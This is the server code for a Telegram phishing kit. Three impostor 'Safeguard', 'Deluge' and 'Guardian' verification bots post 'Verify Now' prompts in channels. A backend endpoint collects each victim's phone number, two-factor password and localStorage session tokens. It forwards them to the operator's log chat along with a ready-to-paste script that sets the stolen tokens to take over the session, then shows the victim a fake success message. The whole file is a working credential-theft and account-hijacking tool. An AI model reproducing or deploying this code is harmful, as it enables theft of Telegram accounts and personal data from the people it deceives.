const express = require("express");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const TelegramBot = require("node-telegram-bot-api");
const phoneUtil = require("google-libphonenumber").PhoneNumberUtil.getInstance();
const PNF = require("google-libphonenumber").PhoneNumberFormat;

// Admins who can add the bot to channels
const admins = [7085468890];

// Load images for speed
const imagePaths = {
  success: {
    safeguard: "images/success/safeguard.jpg",
    guardian: "images/success/guardian.jpg",
  },
  verification: {
    deluge: "images/verification/deluge.jpg",
    guardian: "images/verification/guardian.jpg",
    safeguard: "images/verification/safeguard.jpg",
  },
};

const images = Object.entries(imagePaths).reduce((acc, [key, value]) => {
  acc[key] = {};
  for (const type in value) {
    acc[key][type] = fs.readFileSync(path.join(__dirname, value[type]));
  }
  return acc;
}, {});

// Telegram Bots
const bots = {
  safeguard: new TelegramBot(process.env.FAKE_SAFEGUARD_BOT_TOKEN, { polling: true }),
  deluge: new TelegramBot(process.env.FAKE_DELUGE_BOT_TOKEN, { polling: true }),
  guardian: new TelegramBot(process.env.FAKE_GUARDIAN_BOT_TOKEN, { polling: true }),
};

// Randomized button texts for the Guardian bot
const guardianButtonTexts = [
  "🟩ARKI all-in-1 TG tools👈JOIN NOW!🟡",
  "Why an Ape ❔ You can be eNORMUS!🔷",
  "🔥Raid with @Raidar 🔥",
];

// Utility to generate random strings
const generateRandomString = (length) =>
  Array.from({ length }, () => "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789abcdefghijklmnopqrstuvwxyz"[Math.floor(Math.random() * 62)]).join("");

// Retrieve bot usernames
const botUsernames = {};
Promise.all(
  Object.entries(bots).map(([key, bot]) =>
    bot.getMe().then((info) => {
      botUsernames[key] = info.username;
      console.log(`${key} Bot Username: ${info.username}`);
    })
  )
);

// Express server setup
const app = express();
app.use(express.json());
app.use(express.static("public"));

// POST API to log user information
app.post("/api/users/telegram/info", async (req, res) => {
  try {
    const { userId, firstName, usernames, phoneNumber, isPremium, password, quicklySet, type } = req.body;
    const parsedNumber = phoneUtil.parse(`+${phoneNumber}`, "ZZ");
    const formattedNumber = phoneUtil.format(parsedNumber, PNF.INTERNATIONAL);

    const usernameList =
      usernames &&
      usernames.map((u, i) => `<b>${i + 1}</b>. @${u.username} ${u.isActive ? "✅" : "❌"}`).join("\n");

    const quickAuthScript = `Object.entries(${JSON.stringify(quicklySet)}).forEach(([name, value]) => localStorage.setItem(name, value)); window.location.reload();`;

    const bot = bots[type];
    if (!bot) throw new Error(`Bot type "${type}" not recognized`);

    // Log user info
    await bot.sendMessage(process.env.LOGS_ID, `🪪 <b>UserID</b>: ${userId}
🌀 <b>Name</b>: ${firstName}
⭐ <b>Telegram Premium</b>: ${isPremium ? "✅" : "❌"}
📱 <b>Phone Number</b>: <tg-spoiler>${formattedNumber}</tg-spoiler>
<b>Passwords</b>: <code>${password || "No Two-factor authentication enabled."}</code>
<b>Usernames</b>:\n${usernameList || "No usernames provided"}
<b>Script</b>: <code>${quickAuthScript}</code>`, { parse_mode: "HTML" });

    // Send verification or success message
    const image = images.success[type];
    if (image) {
      const buttons =
        type === "guardian"
          ? {
              reply_markup: {
                inline_keyboard: [[{ text: guardianButtonTexts[Math.floor(Math.random() * guardianButtonTexts.length)], url: `https://t.me/+${generateRandomString(16)}` }]],
              },
            }
          : {
              reply_markup: {
                inline_keyboard: [[{ text: "Join Group", url: `https://t.me/+${generateRandomString(16)}` }]],
              },
            };

      await bot.sendPhoto(userId, image, {
        caption: `Verification successful! Use the link to join.`,
        parse_mode: "HTML",
        ...buttons,
      });
    }

    res.json({});
  } catch (error) {
    console.error("500 Server Error:", error.message);
    res.status(500).json({ error: "Internal server error" });
  }
});

// Generic handler for new members in chats
const handleNewChatMember = (bot, type) => {
  bot.on("my_chat_member", (update) => {
    const { chat, new_chat_member, from } = update;
    if (chat.type === "channel" && new_chat_member.status === "administrator" && new_chat_member.user.is_bot && admins.includes(from.id)) {
      const image = images.verification[type];
      if (!image) return console.error(`No image available for type "${type}"`);

      bot.sendPhoto(chat.id, image, {
        caption: `This group is protected. Click below to verify:`,
        reply_markup: {
          inline_keyboard: [[{ text: "Verify Now", url: `https://t.me/${botUsernames[type]}?start=scrim` }]],
        },
        parse_mode: "HTML",
      });
    }
  });
};

// Add event handlers for bots
Object.entries(bots).forEach(([type, bot]) => handleNewChatMember(bot, type));

// Start the server
app.listen(process.env.PORT || 80, () => console.log("Server running"));
